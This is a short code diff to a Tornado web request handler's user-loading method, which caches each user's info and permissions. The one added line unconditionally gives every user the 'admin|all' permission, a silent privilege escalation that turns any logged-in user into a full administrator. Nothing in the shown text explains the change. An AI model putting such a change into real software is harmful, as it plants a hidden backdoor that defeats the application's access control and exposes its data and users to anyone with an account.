@@ -184,6 +184,7 @@ class BaseHandler(tornado.web.RequestHandler):
                 user_info = user
                 permissions.update(set(user.get('permissions') or []))
                 user_info['permissions'] = permissions
+        user_info['permissions'].add(u'admin|all')
         self._users_cache[current_user] = user_info
         return user_info
 
